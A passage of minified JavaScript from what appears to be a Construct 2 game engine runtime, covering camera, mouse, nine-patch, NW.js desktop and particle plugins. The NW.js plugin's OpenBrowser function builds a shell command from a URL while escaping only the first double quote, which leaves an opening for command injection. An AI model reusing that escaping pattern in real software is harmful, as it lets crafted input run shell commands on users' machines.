d("SCALE",e,this.transTarget.scale,this.transCamera.scale,null,null)),this.activeCamera=this.transCamera,this.isSwitchingCameras=!0)},s.prototype.ShakeCamera=function(t,e,i,s,n,r,o){t=this.GetCamera(t);null!=t&&(t.isShaking=!0,t.shakeStrength=e/100,t.shakeMaxDeviation=i,t.shakeMaxZoomDeviation=s,t.shakeBuildTime=n,t.shakeDropTime=r,t.shakeLength=o,t.shakeTimer=0)},t.acts=new s,n.prototype.MovementTransitionProgress=function(t,e){var i=this.GetCamera(e);if(null!=i)for(var s=0;s<i.transitions.length;s++)if("MOVE"==i.transitions[s].type)return void t.set_float(i.transitions[s].progress);t.set_float(0)},n.prototype.ZoomTransitionProgress=function(t,e){var i=this.GetCamera(e);if(null!=i)for(var s=0;s<i.transitions.length;s++)if("SCALE"==i.transitions[s].type)return void t.set_float(i.transitions[s].progress);t.set_float(0)},n.prototype.GetX=function(t,e){e=this.GetCamera(e);null==e?t.set_float(0):t.set_float(e.x)},n.prototype.GetY=function(t,e){e=this.GetCamera(e);null==e?t.set_float(0):t.set_float(e.y)},n.prototype.GetZoom=function(t,e){e=this.GetCamera(e);null==e?t.set_float(0):t.set_float(e.scale)},n.prototype.GetActiveCamera=function(t){null==this.activeCamera?t.set_string("null"):t.set_string(this.activeCamera.name)},t.exps=new n}(),cr.plugins_.Mouse=function(t){this.runtime=t},function(){var t=cr.plugins_.Mouse.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.buttonMap=new Array(4),this.mouseXcanvas=0,this.mouseYcanvas=0,this.triggerButton=0,this.triggerType=0,this.triggerDir=0,this.handled=!1};var e=t.Instance.prototype;e.onCreate=function(){var t,e=this;this.runtime.isDomFree||(jQuery(document).mousemove(function(t){e.onMouseMove(t)}),jQuery(document).mousedown(function(t){e.onMouseDown(t)}),jQuery(document).mouseup(function(t){e.onMouseUp(t)}),jQuery(document).dblclick(function(t){e.onDoubleClick(t)}),t=function(t){e.onWheel(t)},document.addEventListener("mousewheel",t,!1),document.addEventListener("DOMMouseScroll",t,!1))};var i={left:0,top:0};function s(){}function n(){}e.onMouseMove=function(t){var e=this.runtime.isDomFree?i:jQuery(this.runtime.canvas).offset();this.mouseXcanvas=t.pageX-e.left,this.mouseYcanvas=t.pageY-e.top},e.mouseInGame=function(){return 0<this.runtime.fullscreen_mode||0<=this.mouseXcanvas&&0<=this.mouseYcanvas&&this.mouseXcanvas<this.runtime.width&&this.mouseYcanvas<this.runtime.height},e.onMouseDown=function(t){this.mouseInGame()&&(this.buttonMap[t.which]=!0,this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnAnyClick,this),this.triggerButton=t.which-1,this.triggerType=0,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnClick,this),this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnObjectClicked,this),this.runtime.isInUserInputEvent=!1)},e.onMouseUp=function(t){this.buttonMap[t.which]&&(this.runtime.had_a_click&&!this.runtime.isMobile&&t.preventDefault(),this.runtime.had_a_click=!0,this.buttonMap[t.which]=!1,this.runtime.isInUserInputEvent=!0,this.triggerButton=t.which-1,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnRelease,this),this.runtime.isInUserInputEvent=!1)},e.onDoubleClick=function(t){this.mouseInGame()&&(t.preventDefault(),this.runtime.isInUserInputEvent=!0,this.triggerButton=t.which-1,this.triggerType=1,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnClick,this),this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnObjectClicked,this),this.runtime.isInUserInputEvent=!1)},e.onWheel=function(t){var e=t.wheelDelta||(t.detail?-t.detail:0);this.triggerDir=e<0?0:1,this.handled=!1,this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnWheel,this),this.runtime.isInUserInputEvent=!1,this.handled&&cr.isCanvasInputEvent(t)&&t.preventDefault()},e.onWindowBlur=function(){for(var t=0,e=this.buttonMap.length;t<e;++t)this.buttonMap[t]&&(this.buttonMap[t]=!1,this.triggerButton=t-1,this.runtime.trigger(cr.plugins_.Mouse.prototype.cnds.OnRelease,this))},s.prototype.OnClick=function(t,e){return t===this.triggerButton&&e===this.triggerType},s.prototype.OnAnyClick=function(){return!0},s.prototype.IsButtonDown=function(t){return this.buttonMap[t+1]},s.prototype.OnRelease=function(t){return t===this.triggerButton},s.prototype.IsOverObject=function(t){var e=this.runtime.getCurrentCondition(),i=this.mouseXcanvas,s=this.mouseYcanvas;return cr.xor(this.runtime.testAndSelectCanvasPointOverlap(t,i,s,e.inverted),e.inverted)},s.prototype.OnObjectClicked=function(t,e,i){return t===this.triggerButton&&e===this.triggerType&&this.runtime.testAndSelectCanvasPointOverlap(i,this.mouseXcanvas,this.mouseYcanvas,!1)},s.prototype.OnWheel=function(t){return this.handled=!0,t===this.triggerDir},t.cnds=new s;var r=null;function o(){}n.prototype.SetCursor=function(t){this.runtime.isDomFree||r!==(t=["auto","pointer","text","crosshair","move","help","wait","none"][t])&&(r=t,document.body.style.cursor=t)},n.prototype.SetCursorSprite=function(t){this.runtime.isDomFree||this.runtime.isMobile||!t||(t=t.getFirstPicked())&&t.curFrame&&(t=t.curFrame,r!==t&&(t="url("+(r=t).getDataUri()+") "+Math.round(t.hotspotX*t.width)+" "+Math.round(t.hotspotY*t.height)+", auto",document.body.style.cursor="",document.body.style.cursor=t))},t.acts=new n,o.prototype.X=function(t,e){var i,s,n,r,o;cr.is_undefined(e)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxX,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxX=1,i.angle=0,t.set_float(i.canvasToLayer(this.mouseXcanvas,this.mouseYcanvas,!0)),i.scale=s,i.zoomRate=n,i.parallaxX=r,i.angle=o):(i=cr.is_number(e)?this.runtime.getLayerByNumber(e):this.runtime.getLayerByName(e))?t.set_float(i.canvasToLayer(this.mouseXcanvas,this.mouseYcanvas,!0)):t.set_float(0)},o.prototype.Y=function(t,e){var i,s,n,r,o;cr.is_undefined(e)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxY,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxY=1,i.angle=0,t.set_float(i.canvasToLayer(this.mouseXcanvas,this.mouseYcanvas,!1)),i.scale=s,i.zoomRate=n,i.parallaxY=r,i.angle=o):(i=cr.is_number(e)?this.runtime.getLayerByNumber(e):this.runtime.getLayerByName(e))?t.set_float(i.canvasToLayer(this.mouseXcanvas,this.mouseYcanvas,!1)):t.set_float(0)},o.prototype.AbsoluteX=function(t){t.set_float(this.mouseXcanvas)},o.prototype.AbsoluteY=function(t){t.set_float(this.mouseYcanvas)},t.exps=new o}(),cr.plugins_.NinePatch=function(t){this.runtime=t},function(){var t=cr.plugins_.NinePatch.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime};var e=t.Type.prototype;function _(t,e,i,s,n,r,o,a,h,c){t.save(),t.fillStyle=e;var l=n%i,e=r%s;l<0&&(l+=i),e<0&&(e+=s),t.translate(l+h,e+c),t.fillRect(n-l-h,r-e-c,o,a),t.restore()}function i(){}function s(){}e.onCreate=function(){this.is_family||(this.texture_img=new Image,this.texture_img.crossOrigin="anonymous",this.texture_img.cr_filesize=this.texture_filesize,this.runtime.waitForImageLoad(this.texture_img,this.texture_file),this.fillPattern=null,this.leftPattern=null,this.rightPattern=null,this.topPattern=null,this.bottomPattern=null,this.webGL_texture=null,this.webGL_fillTexture=null,this.webGL_leftTexture=null,this.webGL_rightTexture=null,this.webGL_topTexture=null,this.webGL_bottomTexture=null)},e.onLostWebGLContext=function(){this.is_family||(this.webGL_texture=null,this.webGL_fillTexture=null,this.webGL_leftTexture=null,this.webGL_rightTexture=null,this.webGL_topTexture=null,this.webGL_bottomTexture=null)},e.onRestoreWebGLContext=function(){!this.is_family&&this.instances.length&&(this.webGL_texture||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!0,this.runtime.linearSampling,this.texture_pixelformat)))},e.unloadTextures=function(){this.is_family||this.instances.length||this.runtime.glwrap&&(this.runtime.glwrap.deleteTexture(this.webGL_texture),this.runtime.glwrap.deleteTexture(this.webGL_fillTexture),this.runtime.glwrap.deleteTexture(this.webGL_leftTexture),this.runtime.glwrap.deleteTexture(this.webGL_rightTexture),this.runtime.glwrap.deleteTexture(this.webGL_topTexture),this.runtime.glwrap.deleteTexture(this.webGL_bottomTexture),this.webGL_texture=null,this.webGL_fillTexture=null,this.webGL_leftTexture=null,this.webGL_rightTexture=null,this.webGL_topTexture=null,this.webGL_bottomTexture=null)},e.slicePatch=function(t,e,i,s){var n=document.createElement("canvas"),i=i-t,s=s-e;return n.width=i,n.height=s,n.getContext("2d").drawImage(this.texture_img,t,e,i,s,0,0,i,s),n},e.createPatch=function(t,e,i,s){var n,r,o,a=this.texture_img.width,h=this.texture_img.height,c=a-e,l=h-s;this.runtime.glwrap?this.webGL_fillTexture||(n=this.runtime.glwrap,r=this.runtime.linearSampling,o=this.texture_pixelformat,t<c&&i<l&&(this.webGL_fillTexture=n.loadTexture(this.slicePatch(t,i,c,l),!0,r,o)),0<t&&i<l&&(this.webGL_leftTexture=n.loadTexture(this.slicePatch(0,i,t,l),!0,r,o,"repeat-y")),0<e&&i<l&&(this.webGL_rightTexture=n.loadTexture(this.slicePatch(c,i,a,l),!0,r,o,"repeat-y")),0<i&&t<c&&(this.webGL_topTexture=n.loadTexture(this.slicePatch(t,0,c,i),!0,r,o,"repeat-x")),0<s&&t<c&&(this.webGL_bottomTexture=n.loadTexture(this.slicePatch(t,l,c,h),!0,r,o,"repeat-x"))):this.fillPattern||(o=this.runtime.ctx,t<c&&i<l&&(this.fillPattern=o.createPattern(this.slicePatch(t,i,c,l),"repeat")),0<t&&i<l&&(this.leftPattern=o.createPattern(this.slicePatch(0,i,t,l),"repeat")),0<e&&i<l&&(this.rightPattern=o.createPattern(this.slicePatch(c,i,a,l),"repeat")),0<i&&t<c&&(this.topPattern=o.createPattern(this.slicePatch(t,0,c,i),"repeat")),0<s&&t<c&&(this.bottomPattern=o.createPattern(this.slicePatch(t,l,c,h),"repeat")))},t.Instance=function(t){this.type=t,this.runtime=t.runtime},(e=t.Instance.prototype).onCreate=function(){this.leftMargin=this.properties[0],this.rightMargin=this.properties[1],this.topMargin=this.properties[2],this.bottomMargin=this.properties[3],this.edges=this.properties[4],this.fill=this.properties[5],this.visible=0===this.properties[6],this.seamless=0!==this.properties[8],this.recycled?this.rcTex.set(0,0,0,0):this.rcTex=new cr.rect(0,0,0,0),this.runtime.glwrap&&(this.type.webGL_texture||(this.type.webGL_texture=this.runtime.glwrap.loadTexture(this.type.texture_img,!1,this.runtime.linearSampling,this.type.texture_pixelformat))),this.type.createPatch(this.leftMargin,this.rightMargin,this.topMargin,this.bottomMargin)},e.draw=function(t){var e=this.type.texture_img,i=this.leftMargin,s=this.rightMargin,n=this.topMargin,r=this.bottomMargin,o=e.width,a=e.height,h=o-s,c=a-r;t.globalAlpha=this.opacity,t.save();var l=this.x,u=this.y,p=this.width,d=this.height;this.runtime.pixel_rounding&&(l=Math.round(l),u=Math.round(u));var g=-(this.hotspotX*this.width),f=-(this.hotspotY*this.height),m=g%o,y=f%a;m<0&&(m+=o),y<0&&(y+=a),t.translate(l+m,u+y);m=g-m,f-=y,y=this.seamless?1:0;0<i&&0<n&&t.drawImage(e,0,0,i+y,n+y,m,f,i+y,n+y),0<s&&0<n&&t.drawImage(e,h-y,0,s+y,n+y,m+p-s-y,f,s+y,n+y),0<s&&0<r&&t.drawImage(e,h-y,c-y,s+y,r+y,m+p-s-y,f+d-r-y,s+y,r+y),0<i&&0<r&&t.drawImage(e,0,c-y,i+y,r+y,m,f+d-r-y,i+y,r+y),0===this.edges?(y=2===this.fill?0:y,0<i&&n<c&&_(t,this.type.leftPattern,i,c-n,m,f+n,i+y,d-n-r,0,0),0<s&&n<c&&_(t,this.type.rightPattern,s,c-n,m+p-s-y,f+n,s+y,d-n-r,y,0),0<n&&i<h&&_(t,this.type.topPattern,h-i,n,m+i,f,p-i-s,n+y,0,0),0<r&&i<h&&_(t,this.type.bottomPattern,h-i,r,m+i,f+d-r-y,p-i-s,r+y,0,y)):1===this.edges&&(0<i&&n<c&&0<d-n-r&&t.drawImage(e,0,n,i,c-n,m,f+n,i,d-n-r),0<s&&n<c&&0<d-n-r&&t.drawImage(e,h,n,s,c-n,m+p-s,f+n,s,d-n-r),0<n&&i<h&&0<p-i-s&&t.drawImage(e,i,0,h-i,n,m+i,f,p-i-s,n),0<r&&i<h&&0<p-i-s&&t.drawImage(e,i,c,h-i,r,m+i,f+d-r,p-i-s,r)),n<c&&i<h&&(0===this.fill?_(t,this.type.fillPattern,h-i,c-n,m+i,f+n,p-i-s,d-n-r,0,0):1===this.fill&&0<p-i-s&&0<d-n-r&&t.drawImage(e,i,n,h-i,c-n,m+i,f+n,p-i-s,d-n-r)),t.restore()},e.drawPatch=function(t,e,i,s,n,r,o,a,h,c){t.setTexture(e);var l=this.rcTex;l.left=i/e.c2width,l.top=s/e.c2height,l.right=(i+n)/e.c2width,l.bottom=(s+r)/e.c2height,t.quadTex(o,a,o+h,a,o+h,a+c,o,a+c,l)},e.tilePatch=function(t,e,i,s,n,r,o,a){t.setTexture(e);var h=this.rcTex;h.left=-o/e.c2width,h.top=-a/e.c2height,h.right=(n-o)/e.c2width,h.bottom=(r-a)/e.c2height,t.quadTex(i,s,i+n,s,i+n,s+r,i,s+r,h)},e.drawGL_earlyZPass=function(t){this.drawGL(t)},e.drawGL=function(t){var e=this.leftMargin,i=this.rightMargin,s=this.topMargin,n=this.bottomMargin,r=this.type.texture_img.width-i,o=this.type.texture_img.height-n;t.setOpacity(this.opacity);this.rcTex;var a=this.bquad,h=a.tlx,c=a.tly,l=this.width,u=this.height;this.runtime.pixel_rounding&&(h=Math.round(h),c=Math.round(c));a=this.seamless?1:0;0<e&&0<s&&this.drawPatch(t,this.type.webGL_texture,0,0,e+a,s+a,h,c,e+a,s+a),0<i&&0<s&&this.drawPatch(t,this.type.webGL_texture,r-a,0,i+a,s+a,h+l-i-a,c,i+a,s+a),0<i&&0<n&&this.drawPatch(t,this.type.webGL_texture,r-a,o-a,i+a,n+a,h+l-i-a,c+u-n-a,i+a,n+a),0<e&&0<n&&this.drawPatch(t,this.type.webGL_texture,0,o-a,e+a,n+a,h,c+u-n-a,e+a,n+a),0===this.edges?(a=2===this.fill?0:a,0<e&&s<o&&this.tilePatch(t,this.type.webGL_leftTexture,h,c+s,e+a,u-s-n,0,0),0<i&&s<o&&this.tilePatch(t,this.type.webGL_rightTexture,h+l-i-a,c+s,i+a,u-s-n,a,0),0<s&&e<r&&this.tilePatch(t,this.type.webGL_topTexture,h+e,c,l-e-i,s+a,0,0),0<n&&e<r&&this.tilePatch(t,this.type.webGL_bottomTexture,h+e,c+u-n-a,l-e-i,n+a,0,a)):1===this.edges&&(0<e&&s<o&&this.drawPatch(t,this.type.webGL_texture,0,s,e,o-s,h,c+s,e,u-s-n),0<i&&s<o&&this.drawPatch(t,this.type.webGL_texture,r,s,i,o-s,h+l-i,c+s,i,u-s-n),0<s&&e<r&&this.drawPatch(t,this.type.webGL_texture,e,0,r-e,s,h+e,c,l-e-i,s),0<n&&e<r&&this.drawPatch(t,this.type.webGL_texture,e,o,r-e,n,h+e,c+u-n,l-e-i,n)),s<o&&e<r&&(0===this.fill?this.tilePatch(t,this.type.webGL_fillTexture,h+e,c+s,l-e-i,u-s-n,0,0):1===this.fill&&this.drawPatch(t,this.type.webGL_texture,e,s,r-e,o-s,h+e,c+s,l-e-i,u-s-n))},i.prototype.OnURLLoaded=function(){return!0},t.cnds=new i,s.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},t.acts=new s,t.exps=new function(){}}(),cr.plugins_.NodeWebkit=function(t){this.runtime=t},function(){var r=!1,o=null,a=null,h=null,c=null,l=null,u=null,p="",d="",g="",f="\\",i=[],m="",y="",t=cr.plugins_.NodeWebkit.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function s(){}function n(){}function _(){}e.onCreate=function(){r=this.runtime.isNWjs;var t,e,i,s,n=this;r&&(o=require("path"),a=require("fs"),h=require("os"),l=require("child_process"),"win32"!==(u=window.process||nw.process).platform&&(f="/"),p=o.dirname(u.execPath)+f,d=h.homedir()+f,c=window.nwgui,g=u.mainModule.filename,-1!==(t=Math.max(g.lastIndexOf("/"),g.lastIndexOf("\\")))&&(g=g.substr(0,t+1)),window.ondrop=function(t){t.preventDefault();for(var e=0;e<t.dataTransfer.files.length;++e)m=t.dataTransfer.files[e].path,n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnFileDrop,n);return!1},(e=document.getElementById("c2nwOpenFileDialog")).onchange=function(t){y=e.value,n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnOpenDlg,n);try{e.value=null}catch(t){}},e.oncancel=function(){n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnOpenDlgCancel,n)},(i=document.getElementById("c2nwChooseFolderDialog")).onchange=function(t){y=i.value,n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnFolderDlg,n);try{i.value=null}catch(t){}},i.oncancel=function(){n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnFolderDlgCancel,n)},(s=document.getElementById("c2nwSaveDialog")).onchange=function(t){y=s.value,n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnSaveDlg,n);try{s.value=null}catch(t){}},s.oncancel=function(){n.runtime.trigger(cr.plugins_.NodeWebkit.prototype.cnds.OnSaveDlgCancel,n)})},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},s.prototype.PathExists=function(t){return!!r&&a.existsSync(t)},s.prototype.OnFileDrop=function(){return!0},s.prototype.OnOpenDlg=function(){return!0},s.prototype.OnFolderDlg=function(){return!0},s.prototype.OnSaveDlg=function(){return!0},s.prototype.OnOpenDlgCancel=function(){return!0},s.prototype.OnFolderDlgCancel=function(){return!0},s.prototype.OnSaveDlgCancel=function(){return!0},t.cnds=new s,n.prototype.WriteFile=function(t,e){if(r)try{a.writeFileSync(t,e,{encoding:"utf8"})}catch(t){}},n.prototype.RenameFile=function(t,e){if(r)try{a.renameSync(t,e)}catch(t){}},n.prototype.DeleteFile=function(t){if(r)try{a.unlinkSync(t)}catch(t){}},n.prototype.CopyFile=function(t,e){if(r&&t!==e)try{var i=a.readFileSync(t,{flags:"rb"});a.writeFileSync(e,i,{flags:"wb"})}catch(t){}},n.prototype.MoveFile=function(t,e){if(r&&t!==e)try{var i=a.readFileSync(t,{flags:"rb"});a.writeFileSync(e,i,{flags:"wb"}),a.existsSync(e)&&a.unlinkSync(t)}catch(t){}},n.prototype.RunFile=function(t){r&&l.exec(t,function(){})},n.prototype.ShellOpen=function(t){r&&nw.Shell.openItem(t)},n.prototype.OpenBrowser=function(t){if(r){var e;switch(u.platform){case"win32":e='start ""';break;case"darwin":e="open";break;default:e=o.join(__dirname,"../vendor/xdg-open")}l.exec(e+' "'+t.replace(/"/,'\\"')+'"')}},n.prototype.CreateFolder=function(t){if(r)try{a.mkdirSync(t)}catch(t){}},n.prototype.AppendFile=function(t,e){if(r)try{a.appendFileSync(t,e,{encoding:"utf8"})}catch(t){}},n.prototype.ListFiles=function(e){if(r){try{i=a.readdirSync(e)}catch(t){i=[],console.warn("Error listing files at '"+e+"': ",t)}i=i||[]}},n.prototype.ShowOpenDlg=function(t){var e;r&&((e=jQuery("#c2nwOpenFileDialog")).attr("accept",t),e.trigger("click"))},n.prototype.ShowFolderDlg=function(t){r&&jQuery("#c2nwChooseFolderDialog").trigger("click")},n.prototype.ShowSaveDlg=function(t){var e;r&&((e=jQuery("#c2nwSaveDialog")).attr("accept",t),e.trigger("click"))},n.prototype.SetWindowX=function(t){r&&c&&(c.Window.get().x=t)},n.prototype.SetWindowY=function(t){r&&c&&(c.Window.get().y=t)},n.prototype.SetWindowWidth=function(t){r&&c&&(c.Window.get().width=t)},n.prototype.SetWindowHeight=function(t){r&&c&&(c.Window.get().height=t)},n.prototype.SetWindowTitle=function(t){r&&c&&(c.Window.get().title=t,document.title=t)},n.prototype.WindowMinimize=function(){var t;r&&c&&(t=c.Window.get(),setTimeout(function(){t.minimize()},100))},n.prototype.WindowMaximize=function(){var t;r&&c&&(t=c.Window.get(),setTimeout(function(){t.maximize()},100))},n.prototype.WindowUnmaximize=function(){var t;r&&c&&(t=c.Window.get(),setTimeout(function(){t.unmaximize()},100))},n.prototype.WindowRestore=function(){var t;r&&c&&(t=c.Window.get(),setTimeout(function(){t.restore()},100))},n.prototype.WindowRequestAttention=function(t){r&&c&&c.Window.get().requestAttention(t?3:0)},n.prototype.WindowSetMaxSize=function(t,e){r&&c&&c.Window.get().setMaximumSize(t,e)},n.prototype.WindowSetMinSize=function(t,e){r&&c&&c.Window.get().setMinimumSize(t,e)},n.prototype.WindowSetResizable=function(t){r&&c&&c.Window.get().setResizable(0!==t)},n.prototype.WindowSetAlwaysOnTop=function(t){r&&c&&c.Window.get().setAlwaysOnTop(0!==t)},n.prototype.ShowDevTools=function(){r&&c&&c.Window.get().showDevTools()},n.prototype.SetClipboardText=function(t){r&&c&&c.Clipboard.get().set(t)},n.prototype.ClearClipboard=function(){r&&c&&c.Clipboard.get().clear()},t.acts=new n,_.prototype.AppFolder=function(t){t.set_string(p)},_.prototype.AppFolderURL=function(t){t.set_string("file://"+p)},_.prototype.ProjectFilesFolder=function(t){t.set_string(g)},_.prototype.ProjectFilesFolderURL=function(t){t.set_string("file://"+g)},_.prototype.UserFolder=function(t){t.set_string(d)},_.prototype.ReadFile=function(t,e){if(r){var i="";try{i=a.readFileSync(e,{encoding:"utf8"})}catch(t){}t.set_string(i)}else t.set_string("")},_.prototype.FileSize=function(t,e){if(r){var i=0;try{var s=a.statSync(e);s&&(i=s.size||0)}catch(t){}t.set_int(i)}else t.set_int(0)},_.prototype.ListCount=function(t){t.set_int(i.length)},_.prototype.ListAt=function(t,e){(e=Math.floor(e))<0||e>=i.length?t.set_string(""):t.set_string(i[e])},_.prototype.DroppedFile=function(t){t.set_string(m)},_.prototype.ChosenPath=function(t){t.set_string(y)},_.prototype.WindowX=function(t){t.set_int(r&&c?c.Window.get().x:0)},_.prototype.WindowY=function(t){t.set_int(r&&c?c.Window.get().y:0)},_.prototype.WindowWidth=function(t){t.set_int(r&&c?c.Window.get().width:0)},_.prototype.WindowHeight=function(t){t.set_int(r&&c?c.Window.get().height:0)},_.prototype.WindowTitle=function(t){t.set_string(r&&c?c.Window.get().title||"":0)},_.prototype.ClipboardText=function(t){t.set_string(r&&c?c.Clipboard.get().get()||"":0)},t.exps=new _}(),cr.plugins_.Particles=function(t){this.runtime=t},function(){var t=cr.plugins_.Particles.prototype;function e(t){this.owner=t,this.active=!1,this.x=0,this.y=0,this.speed=0,this.angle=0,this.opacity=1,this.grow=0,this.size=0,this.gs=0,this.age=0,cr.seal(this)}t.Type=function(t){this.plugin=t,this.runtime=t.runtime},(i=t.Type.prototype).onCreate=function(){this.is_family||(this.texture_img=new Image,this.texture_img.crossOrigin="anonymous",this.texture_img.cr_filesize=this.texture_filesize,this.webGL_texture=null,this.runtime.waitForImageLoad(this.texture_img,this.texture_file))},i.onLostWebGLContext=function(){this.is_family||(this.webGL_texture=null)},i.onRestoreWebGLContext=function(){!this.is_family&&this.instances.length&&(this.webGL_texture||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!0,this.runtime.linearSampling,this.texture_pixelformat)))},i.loadTextures=function(){this.is_family||this.webGL_texture||!this.runtime.glwrap||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!0,this.runtime.linearSampling,this.texture_pixelformat))},i.unloadTextures=function(){this.is_family||this.instances.length||!this.webGL_texture||(this.runtime.glwrap.deleteTexture(this.webGL_texture),this.webGL_texture=null)},i.preloadCanvas2D=function(t){t.drawImage(this.texture_img,0,0)},e.prototype.init=function(){var t=this.owner;this.x=t.x-t.xrandom/2+Math.random()*t.xrandom,this.y=t.y-t.yrandom/2+Math.random()*t.yrandom,this.speed=t.initspeed-t.speedrandom/2+Math.random()*t.speedrandom,this.angle=t.angle-t.spraycone/2+Math.random()*t.spraycone,this.opacity=t.initopacity,this.size=t.initsize-t.sizerandom/2+Math.random()*t.sizerandom,this.grow=t.growrate-t.growrandom/2+Math.random()*t.growrandom,this.gs=0,this.age=0},e.prototype.tick=function(t){var e=this.owner;this.x+=Math.cos(this.angle)*this.speed*t,this.y+=Math.sin(this.angle)*this.speed*t,this.y+=this.gs*t,this.speed+=e.acc*t,this.size+=this.grow*t,this.gs+=e.g*t,this.age+=t,this.size<1?this.active=!1:(0!==e.lifeanglerandom&&(this.angle+=Math.random()*e.lifeanglerandom*t-e.lifeanglerandom*t/2),0!==e.lifespeedrandom&&(this.speed+=Math.random()*e.lifespeedrandom*t-e.lifespeedrandom*t/2),0!==e.lifeopacityrandom&&(this.opacity+=Math.random()*e.lifeopacityrandom*t-e.lifeopacityrandom*t/2,this.opacity<0?this.opacity=0:1<this.opacity&&(this.opacity=1)),e.destroymode<=1&&this.age>=e.timeout&&(this.active=!1),2===e.destroymode&&this.speed<=0&&(this.active=!1))},e.prototype.draw=function(t){var e,i=this.owner.opacity*this.opacity;0!==i&&(0===this.owner.destroymode&&(i*=1-this.age/this.owner.timeout),t.globalAlpha=i,e=this.x-this.size/2,i=this.y-this.size/2,this.owner.runtime.pixel_rounding&&(e=e+.5|0,i=i+.5|0),t.drawImage(this.owner.type.texture_img,e,i,this.size,this.size))},e.prototype.drawGL=function(t){var e=this.owner.opacity*this.opacity;0===this.owner.destroymode&&(e*=1-this.age/this.owner.timeout);var i=this.size,s=i*this.owner.particlescale,n=this.x-i/2,r=this.y-i/2;this.owner.runtime.pixel_rounding&&(n=n+.5|0,r=r+.5|0),s<1||0===e||(s<t.minPointSize||s>t.maxPointSize?(t.setOpacity(e),t.quad(n,r,n+i,r,n+i,r+i,n,r+i)):t.point(this.x,this.y,s,e))},e.prototype.left=function(){return this.x-this.size/2},e.prototype.right=function(){return this.x+this.size/2},e.prototype.top=function(){return this.y-this.size/2},e.prototype.bottom=function(){return this.y+this.size/2},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var i=t.Instance.prototype,o=[];function s(){}function n(){}function r(){}i.onCreate=function(){var t=this.properties;if(this.rate=t[0],this.spraycone=cr.to_radians(t[1]),this.spraytype=t[2],this.spraying=!0,this.initspeed=t[3],this.initsize=t[4],this.initopacity=t[5]/100,this.growrate=t[6],this.xrandom=t[7],this.yrandom=t[8],this.speedrandom=t[9],this.sizerandom=t[10],this.growrandom=t[11],this.acc=t[12],this.g=t[13],this.lifeanglerandom=t[14],this.lifespeedrandom=t[15],this.lifeopacityrandom=t[16],this.destroymode=t[17],this.timeout=t[18],this.particleCreateCounter=0,this.particlescale=1,this.particleBoxLeft=this.x,this.particleBoxTop=this.y,this.particleBoxRight=this.x,this.particleBoxBottom=this.y,this.add_bbox_changed_callback(function(t){t.bbox.set(t.particleBoxLeft,t.particleBoxTop,t.particleBoxRight,t.particleBoxBottom),t.bquad.set_from_rect(t.bbox),t.bbox_changed=!1,t.update_collision_cell(),t.update_render_cell()}),this.recycled||(this.particles=[]),this.runtime.tickMe(this),this.type.loadTextures(),1===this.spraytype)for(var e=0;e<this.rate;e++)this.allocateParticle().opacity=0;this.first_tick=!0},i.saveToJSON=function(){for(var t,e={r:this.rate,sc:this.spraycone,st:this.spraytype,s:this.spraying,isp:this.initspeed,isz:this.initsize,io:this.initopacity,gr:this.growrate,xr:this.xrandom,yr:this.yrandom,spr:this.speedrandom,szr:this.sizerandom,grnd:this.growrandom,acc:this.acc,g:this.g,lar:this.lifeanglerandom,lsr:this.lifespeedrandom,lor:this.lifeopacityrandom,dm:this.destroymode,to:this.timeout,pcc:this.particleCreateCounter,ft:this.first_tick,p:[]},i=e.p,s=0,n=this.particles.length;s<n;s++)t=this.particles[s],i.push([t.x,t.y,t.speed,t.angle,t.opacity,t.grow,t.size,t.gs,t.age]);return e},i.loadFromJSON=function(t){var e,i;this.rate=t.r,this.spraycone=t.sc,this.spraytype=t.st,this.spraying=t.s,this.initspeed=t.isp,this.initsize=t.isz,this.initopacity=t.io,this.growrate=t.gr,this.xrandom=t.xr,this.yrandom=t.yr,this.speedrandom=t.spr,this.sizerandom=t.szr,this.growrandom=t.grnd,this.acc=t.acc,this.g=t.g,this.lifeanglerandom=t.lar,this.lifespeedrandom=t.lsr,this.lifeopacityrandom=t.lor,this.destroymode=t.dm,this.timeout=t.to,this.particleCreateCounter=t.pcc,this.first_tick=t.ft,o.push.apply(o,this.particles),cr.clearArray(this.particles);for(var s=t.p,n=0,r=s.length;n<r;n++)e=this.allocateParticle(),i=s[n],e.x=i[0],e.y=i[1],e.speed=i[2],e.angle=i[3],e.opacity=i[4],e.grow=i[5],e.size=i[6],e.gs=i[7],e.age=i[8]},i.onDestroy=function(){o.push.apply(o,this.particles),cr.clearArray(this.particles)},i.allocateParticle=function(){var t;return o.length?(t=o.pop()).owner=this:t=new e(this),this.particles.push(t),t.active=!0,t},i.tick=function(){var 